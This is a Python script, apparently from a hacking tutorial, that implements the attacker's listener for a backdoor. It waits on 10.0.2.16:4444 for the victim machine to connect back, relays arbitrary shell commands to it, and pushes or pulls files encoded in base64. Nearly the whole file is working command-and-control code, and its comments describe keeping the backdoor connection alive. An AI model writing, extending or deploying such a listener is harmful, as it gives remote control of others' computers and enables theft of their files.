#!/usr/bin/env python
#if client or server crash connection will be lost 
#backdoor crashes because incorrect command send or correct command is misused 
#so need exception handle 
#you can get exception given different wrong input and can handle it using that exception you get as result
#but it dont always work because there may be the exception for some command or some input you never know
#so handle all the exception that may be possible for good user experience.
# may be handling all exception at once is not great soln but it works fine for this backdoor as we want to maintain connection.
#  
import socket,json,base64
class Listener:
    def __init__(self,ip,port):
        listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) 
        listener.bind((ip,port)) 
        listener.listen(0) 
        print("[+] waiting for incoming connection")
        self.connection, address=listener.accept() #to make connection acceptable to anywhere in code use self
        print("[+] got connection from " + str(address))
    def reliable_receive(self):#best implementation look serialisation once.value error is due to receiving and unpacking incomplete data
        #use instead of socket send method for everytime we need to send data 
        json_data=""
        while True:
            try:
                json_data=json_data + self.connection.recv(1024)
                return json.loads(json_data) 
            except ValueError:
                continue                
    def reliable_send(self,data):#use instead of socket send method for everytime we need to send data 
        json_data=json.dumps(data)#convert to json
        self.connection.send(json_data)    
    def execute_remotly(self,command):
        self.reliable_send(command) 
        if command[0]=="exit":
            self.connection.close()
            exit()
        return self.reliable_receive() 
    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Successfully downloaded file"    
    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())         

    def run(self):
        while True:
            command = input(">>")
            command=command.split(" ")#send command in list besause serialization helps to send in any form
            # print(command)
            try:
                if command[0]=="upload":
                    file_content=self.read_file(command[1])#look again error
                    command.append(file_content)
                result=self.execute_remotly(command)
                if command[0]=="download" and "[-] error" not in result:
                    result=self.write_file(command[1],result)
            except Exception:
                result="[-] error during your command execution"          
            print(result)
listener_obj=Listener("10.0.2.16",4444)
listener_obj.run()            

#the downloaded file should be shaved in location with same name rather than printed on screen so
#for listening remote computer you need to configure your computer to receive remote connection